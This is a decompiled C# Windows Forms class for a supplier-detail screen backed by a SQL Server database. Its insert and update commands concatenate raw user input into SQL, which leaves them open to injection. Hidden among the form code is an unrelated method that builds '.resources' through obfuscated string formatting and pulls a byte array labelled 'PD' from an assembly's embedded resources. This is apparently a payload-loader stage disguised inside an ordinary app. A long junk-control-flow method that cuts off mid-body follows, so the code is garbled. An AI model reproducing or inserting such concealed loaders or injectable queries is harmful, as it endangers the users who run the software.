using System;
using System.Collections;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Cd2;
using Dn57;
using Fg5p;
using Jr8;
using Microsoft.VisualBasic.CompilerServices;
using Ps92;
using Wy4;
using Xr2;
using b1C5;
using j8P3;
using k6J;
using n4M;
using n7K;
using o1N;
using o9R;
using p6S;
using y1M;
using y8D;

namespace n0WD;

[DesignerGenerated]
public class Ln53 : Form
{
	private IContainer components;

	private string cs;

	private SqlConnection cn;

	private SqlCommand cmd;

	private SqlDataReader rd;

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = q7Z2;
			Label label = _Label6;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = b0K8;
			Label label = _Label7;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label7 = value;
			label = _Label7;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSRcode")]
	internal virtual TextBox txtSRcode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSRName")]
	internal virtual TextBox txtSRName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSCode")]
	internal virtual TextBox txtSCode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnDelete
	{
		[CompilerGenerated]
		get
		{
			return _btnDelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Qi31;
			Button val = _btnDelete;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnDelete = value;
			val = _btnDelete;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnModify
	{
		[CompilerGenerated]
		get
		{
			return _btnModify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = z6R9;
			Button val = _btnModify;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnModify = value;
			val = _btnModify;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSEmail")]
	internal virtual TextBox txtSEmail
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSName")]
	internal virtual TextBox txtSName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSRAmount")]
	internal virtual TextBox txtSRAmount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Aq45;
			Button val = _btnSave;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnSave = value;
			val = _btnSave;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSphoneno")]
	internal virtual TextBox txtSphoneno
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Ln53()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Mz71);
		cs = "Data Source=DESKTOP-1L8UME0\\SQLEXPRESS;Initial Catalog=db_fabric;Integrated Security=True";
		cn = new SqlConnection(cs);
		cmd = new SqlCommand();
		Ge8f();
	}

	[DebuggerNonUserCode]
	protected override void d5JB(bool x5M6)
	{
		try
		{
			if (x5M6 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(x5M6);
		}
	}

	[DebuggerStepThrough]
	private void Ge8f()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Expected O, but got Unknown
		//IL_0259: Unknown result type (might be due to invalid IL or missing references)
		//IL_0263: Expected O, but got Unknown
		Label3 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		txtSRcode = new TextBox();
		Label10 = new Label();
		DataGridView1 = new DataGridView();
		Label9 = new Label();
		txtSRName = new TextBox();
		Label8 = new Label();
		Label5 = new Label();
		Label4 = new Label();
		txtSCode = new TextBox();
		btnDelete = new Button();
		btnModify = new Button();
		txtSEmail = new TextBox();
		txtSName = new TextBox();
		txtSRAmount = new TextBox();
		Label2 = new Label();
		btnSave = new Button();
		txtSphoneno = new TextBox();
		Label1 = new Label();
		((ISupportInitialize)DataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(336, 29));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(115, 17));
		((Control)Label3).set_TabIndex(9);
		Label3.set_Text("Supplier Detail");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Blue);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(721, 29));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(18, 17));
		((Control)Label6).set_TabIndex(11);
		Label6.set_Text("X");
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Blue);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(29, 29));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(92, 17));
		((Control)Label7).set_TabIndex(10);
		Label7.set_Text("Go To Main");
		((Control)txtSRcode).set_Location(new Point(504, 151));
		((Control)txtSRcode).set_Name("txtSRcode");
		((Control)txtSRcode).set_Size(new Size(100, 20));
		((Control)txtSRcode).set_TabIndex(6);
		Label10.set_AutoSize(true);
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(428, 157));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(60, 13));
		((Control)Label10).set_TabIndex(99);
		Label10.set_Text("Raw Code:");
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)DataGridView1).set_Location(new Point(32, 239));
		((Control)DataGridView1).set_Name("DataGridView1");
		((Control)DataGridView1).set_Size(new Size(724, 199));
		((Control)DataGridView1).set_TabIndex(11);
		Label9.set_AutoSize(true);
		((Control)Label9).set_ForeColor(Color.White);
		((Control)Label9).set_Location(new Point(422, 95));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(66, 13));
		((Control)Label9).set_TabIndex(96);
		Label9.set_Text("Raw Name :");
		((Control)txtSRName).set_Location(new Point(504, 88));
		((Control)txtSRName).set_Name("txtSRName");
		((Control)txtSRName).set_Size(new Size(100, 20));
		((Control)txtSRName).set_TabIndex(4);
		Label8.set_AutoSize(true);
		((Control)Label8).set_ForeColor(Color.White);
		((Control)Label8).set_Location(new Point(164, 182));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(50, 13));
		((Control)Label8).set_TabIndex(94);
		Label8.set_Text("Email Id :");
		Label5.set_AutoSize(true);
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(134, 122));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(82, 13));
		((Control)Label5).set_TabIndex(93);
		Label5.set_Text("Supplier Name :");
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(414, 127));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(74, 13));
		((Control)Label4).set_TabIndex(92);
		Label4.set_Text("Raw Amount :");
		((Control)txtSCode).set_Location(new Point(241, 85));
		((Control)txtSCode).set_Name("txtSCode");
		((Control)txtSCode).set_Size(new Size(100, 20));
		((Control)txtSCode).set_TabIndex(0);
		((Control)btnDelete).set_Location(new Point(483, 202));
		((Control)btnDelete).set_Name("btnDelete");
		((Control)btnDelete).set_Size(new Size(75, 31));
		((Control)btnDelete).set_TabIndex(9);
		((ButtonBase)btnDelete).set_Text("DELETE");
		((ButtonBase)btnDelete).set_UseVisualStyleBackColor(true);
		((Control)btnModify).set_Location(new Point(365, 202));
		((Control)btnModify).set_Name("btnModify");
		((Control)btnModify).set_Size(new Size(75, 31));
		((Control)btnModify).set_TabIndex(8);
		((ButtonBase)btnModify).set_Text("MODIFY");
		((ButtonBase)btnModify).set_UseVisualStyleBackColor(true);
		((Control)txtSEmail).set_Location(new Point(241, 176));
		((Control)txtSEmail).set_Name("txtSEmail");
		((Control)txtSEmail).set_Size(new Size(100, 20));
		((Control)txtSEmail).set_TabIndex(3);
		((Control)txtSName).set_Location(new Point(239, 115));
		((Control)txtSName).set_Name("txtSName");
		((Control)txtSName).set_Size(new Size(100, 20));
		((Control)txtSName).set_TabIndex(1);
		((Control)txtSRAmount).set_Location(new Point(504, 122));
		((Control)txtSRAmount).set_Name("txtSRAmount");
		((Control)txtSRAmount).set_Size(new Size(100, 20));
		((Control)txtSRAmount).set_TabIndex(5);
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(138, 88));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(79, 13));
		((Control)Label2).set_TabIndex(90);
		Label2.set_Text("Supplier Code :");
		((Control)btnSave).set_Location(new Point(236, 202));
		((Control)btnSave).set_Name("btnSave");
		((Control)btnSave).set_Size(new Size(75, 31));
		((Control)btnSave).set_TabIndex(7);
		((ButtonBase)btnSave).set_Text("SAVE");
		((ButtonBase)btnSave).set_UseVisualStyleBackColor(true);
		((Control)txtSphoneno).set_Location(new Point(239, 150));
		((Control)txtSphoneno).set_Name("txtSphoneno");
		((Control)txtSphoneno).set_Size(new Size(100, 20));
		((Control)txtSphoneno).set_TabIndex(2);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(153, 153));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(61, 13));
		((Control)Label1).set_TabIndex(101);
		Label1.set_Text("Phone No :");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(0, 0, 64));
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)txtSphoneno);
		((Control)this).get_Controls().Add((Control)(object)txtSRcode);
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)txtSRName);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)txtSCode);
		((Control)this).get_Controls().Add((Control)(object)btnDelete);
		((Control)this).get_Controls().Add((Control)(object)btnModify);
		((Control)this).get_Controls().Add((Control)(object)txtSEmail);
		((Control)this).get_Controls().Add((Control)(object)txtSName);
		((Control)this).get_Controls().Add((Control)(object)txtSRAmount);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)btnSave);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("frmSupplierDetail");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("frmSupplierDetail");
		((ISupportInitialize)DataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void b0K8(object sender, EventArgs e)
	{
		Jy1 jy = new Jy1();
		((Control)jy).Show();
		((Control)this).Hide();
	}

	private void q7Z2(object sender, EventArgs e)
	{
		((Component)this).Dispose();
	}

	private void Mz71(object sender, EventArgs e)
	{
		n4P1();
	}

	private void Aq45(object sender, EventArgs e)
	{
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("insert into tbl_supplier_detail values(" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())) + ",'" + txtSName.get_Text() + "','" + txtSphoneno.get_Text() + "','" + txtSEmail.get_Text() + "','" + txtSRName.get_Text() + "'," + Conversions.ToString(Conversions.ToInteger(txtSRAmount.get_Text())) + "," + Conversions.ToString(Conversions.ToInteger(txtSRcode.get_Text())) + ")");
			cmd.ExecuteReader();
			MessageBox.Show("Record Saved");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		n4P1();
	}

	public void n4P1()
	{
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		DataGridView1.get_Rows().Clear();
		DataGridView1.get_Columns().Clear();
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("select * from tbl_supplier_detail");
			rd = cmd.ExecuteReader();
			DataGridView1.get_Columns().Add("c1", "Supplier Code");
			DataGridView1.get_Columns().Add("c2", "Supplier Name");
			DataGridView1.get_Columns().Add("c3", "Phone No");
			DataGridView1.get_Columns().Add("c4", "Email Id");
			DataGridView1.get_Columns().Add("c5", "Raw Name");
			DataGridView1.get_Columns().Add("c6", "Raw Amount");
			DataGridView1.get_Columns().Add("c7", "Raw Code");
			while (rd.Read())
			{
				DataGridView1.get_Rows().Add(new object[7]
				{
					rd.get_Item("scode").ToString(),
					rd.get_Item("sname"),
					rd.get_Item("sphoneno"),
					rd.get_Item("semail"),
					rd.get_Item("raw"),
					rd.get_Item("rawamt").ToString(),
					rd.get_Item("rawcode").ToString()
				});
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
	}

	private void Qi31(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("delete from tbl_supplier_detail where scode=" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Deleted");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		n4P1();
	}

	private void z6R9(object sender, EventArgs e)
	{
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("update tbl_supplier_detail set sname='" + txtSName.get_Text() + "',sphoneno='" + txtSphoneno.get_Text() + "',semail='" + txtSEmail.get_Text() + "',raw='" + txtSRName.get_Text() + "',rawamt=" + Conversions.ToString(Conversions.ToInteger(txtSRAmount.get_Text())) + ",rawcode=" + Conversions.ToString(Conversions.ToInteger(txtSRcode.get_Text())) + "  where scode=" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Modified");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		n4P1();
	}

	internal static byte[] Tj6z(string[] Kr5x, int Yf8p)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Kr5x.Length - 1 + 1];
				int num = Kr5x.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						string value = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
						if (Kr5x[i].Contains(value))
						{
							int startIndex = Kr5x[i].IndexOf(value);
							array[i] = Kr5x[i].Remove(startIndex, 10);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Em1.mDic["AO"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "PD", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static void x2HZ()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Ln53 ln);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out a1B a1B);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nuint uIntPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CModule_003E _003CModule_003E);
		try
		{
			while (obj != null)
			{
				do
				{
					_ = (b1YL)(object)a7W.Default;
					_ = a7W.Default;
					_ = (Nm2f)(object)a7W.Default;
					a1B = null;
					a1B = a1B;
					obj = a7W.Default;
				}
				while (obj != null);
			}
		}
		finally
		{
			uIntPtr = uIntPtr;
			if (uIntPtr == (UIntPtr)(nuint)0u)
			{
				while (obj != null)
				{
					b6E b6E = null;
					b6E = b6E;
				}
			}
			else if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				_ = (Ta6)(object)a7W.Default;
				_003CModule_003E obj2 = (_003CModule_003E)(object)a7W.Default;
				_003CModule_003E = null;
				_003CModule_003E = obj2;
				b6E b6E = (b6E)(object)a7W.Default;
				Ln53 obj3 = (Ln53)(object)a7W.Default;
				ln = ln;
				ln = obj3;
			}
			goto IL_00c3;
		}
		IL_00c3:
		while (obj != null)
		{
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Zo8 zo);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Nm2f nm2f);
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			do
			{
				_ = a7W.Default;
			}
			while (obj != null);
		}
		else
		{
			nm2f = null;
			nm2f = nm2f;
			Zo8 obj4 = (Zo8)(object)a7W.Default;
			zo = (Zo8)(object)a7W.Default;
			zo = obj4;
			a1B = a1B;
		}
		try
		{
			_ = (Qg6)(object)a7W.Default;
		}
		catch
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				_ = (Ln53)(object)a7W.Default;
			}
			else
			{
				_ = (Ln53)(object)a7W.Default;
			}
		}
		finally
		{
			uIntPtr = default(UIntPtr);
			if (uIntPtr == 0)
			{
				if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
				{
					_ = (b1YL)(object)a7W.Default;
				}
				else
				{
					_ = (s9EJ)(object)a7W.Default;
				}
			}
			goto IL_0181;
		}
		IL_02f2:
		try
		{
			do
			{
				_ = (En1)(object)a7W.Default;
			}
			while (obj != null);
		}
		catch
		{
			if (uIntPtr == 0)
			{
				b1YL b1YL = b1YL;
				b1YL = b1YL;
			}
			else
			{
				_ = (Jy1)(object)a7W.Default;
			}
		}
		finally
		{
			do
			{
				nm2f = nm2f;
			}
			while ((object)a7W.Default != null);
			goto IL_0347;
		}
		IL_061b:
		while (obj != null)
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u && (UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				ln = ln;
				a7W a7W = null;
			}
		}
		Sm6 sm = sm;
		sm = sm;
		Em1 em = null;
		sm = sm;
		_ = (Ta6)(object)a7W.Default;
		do
		{
			a7W a7W = a7W.Default;
		}
		while ((object)a7W.Default != null || (object)a7W.Default != null);
		return;
		IL_054c:
		Ta6 ta = null;
		En1 en;
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			_ = (a1B)(object)a7W.Default;
		}
		else
		{
			do
			{
				try
				{
					en = en;
				}
				finally
				{
					_ = (Nn9a)(object)a7W.Default;
					continue;
				}
			}
			while (obj != null);
		}
		_ = (_003CModule_003E)(object)a7W.Default;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Jy1 jy);
		try
		{
			if (default(UIntPtr) != (UIntPtr)(nuint)0u)
			{
				try
				{
					jy = (Jy1)(object)a7W.Default;
				}
				finally
				{
					Nn9a nn9a = nn9a;
					nn9a = nn9a;
					goto end_IL_058d;
				}
			}
			try
			{
				_ = (s9EJ)(object)a7W.Default;
			}
			catch
			{
				_ = (_003CModule_003E)(object)a7W.Default;
			}
			end_IL_058d:;
		}
		finally
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				_ = (j3J)(object)a7W.Default;
			}
			goto IL_061b;
		}
		IL_039c:
		UIntPtr num = (UIntPtr)a7W.Default;
		uIntPtr = default(UIntPtr);
		if ((nuint)num / checked(unchecked((nuint)default(UIntPtr)) - (unchecked((nuint)default(UIntPtr)) - uIntPtr)) == 0)
		{
			_ = (i0A1)(object)a7W.Default;
		}
		checked
		{
			if (uIntPtr == 0)
			{
				uIntPtr = default(UIntPtr);
				if (unchecked((nuint)default(UIntPtr)) - uIntPtr - unchecked(uIntPtr / uIntPtr) != 0)
				{
					try
					{
						en = (En1)(object)a7W.Default;
					}
					finally
					{
						Em1 obj8 = (Em1)(object)a7W.Default;
						em = (Em1)(object)a7W.Default;
						em = obj8;
						goto IL_0471;
					}
				}
				ta = ta;
				j3J j3J = null;
				a7W obj9 = a7W.Default;
				a7W a7W = a7W;
				a7W = obj9;
				_ = (Qg6)(object)a7W.Default;
			}
			goto IL_0471;
		}
		IL_0181:
		if (uIntPtr == 0)
		{
			if (checked(uIntPtr * uIntPtr) == 0)
			{
				j3J j3J = (j3J)(object)a7W.Default;
				j3J = j3J;
				_003CModule_003E = _003CModule_003E;
				_ = (Jy1)(object)a7W.Default;
			}
			else
			{
				_ = (b1YL)(object)a7W.Default;
			}
		}
		else
		{
			try
			{
				_ = (b1YL)(object)a7W.Default;
			}
			catch
			{
				nm2f = null;
				_ = (y8R)(object)a7W.Default;
				_ = (y8R)(object)a7W.Default;
				b6E b6E = null;
				nm2f = null;
			}
		}
		do
		{
			_ = (Nm2f)(object)a7W.Default;
		}
		while ((object)a7W.Default != null || obj != null || obj != null);
		do
		{
			IL_0261:
			if ((object)a7W.Default != null)
			{
				try
				{
					zo = (Zo8)(object)a7W.Default;
				}
				finally
				{
					_ = (Ln53)(object)a7W.Default;
					Ta6 obj11 = (Ta6)(object)a7W.Default;
					ta = null;
					ta = obj11;
					j3J j3J = null;
					goto IL_0261;
				}
			}
		}
		while (obj != null);
		try
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				while ((object)a7W.Default != null)
				{
					ln = ln;
				}
			}
		}
		finally
		{
			en = (En1)(object)a7W.Default;
			en = null;
			goto IL_02a8;
		}
		IL_0471:
		uIntPtr = default(UIntPtr);
		checked
		{
			if (uIntPtr * unchecked((nuint)(UIntPtr)a7W.Default) - uIntPtr == 0)
			{
				_ = (En1)(object)a7W.Default;
			}
			try
			{
				_ = (Qg6)(object)a7W.Default;
			}
			catch
			{
				while (obj != null)
				{
				}
			}
			while (true)
			{
				if ((object)a7W.Default != null)
				{
					do
					{
						zo = zo;
					}
					while (obj != null);
				}
				else if (obj == null)
				{
					break;
				}
			}
			_ = (Ln53)(object)a7W.Default;
			try
			{
				if (unchecked((nuint)(UIntPtr)a7W.Default) + unchecked((nuint)(UIntPtr)a7W.Default) + unchecked((nuint)default(UIntPtr)) == 0)
				{
					try
					{
						_003CModule_003E = null;
					}
					catch
					{
						_003CModule_003E = (_003CModule_003E)(object)a7W.Default;
					}
				}
			}
			finally
			{
				try
				{
					_ = (Sm6)(object)a7W.Default;
				}
				finally
				{
					uIntPtr = default(UIntPtr);
					if (uIntPtr == unchecked((UIntPtr)(nuint)0u))
					{
						em = em;
					}
					goto IL_054c;
				}
			}
		}
		IL_02a8:
		do
		{
			_ = (Nn9a)(object)a7W.Default;
		}
		while (obj != null);
		try
		{
			do
			{
				_ = (Nn9a)(object)a7W.Default;
			}
			while (obj != null);
		}
		catch
		{
			do
			{
				zo = null;
			}
			while (obj != null);
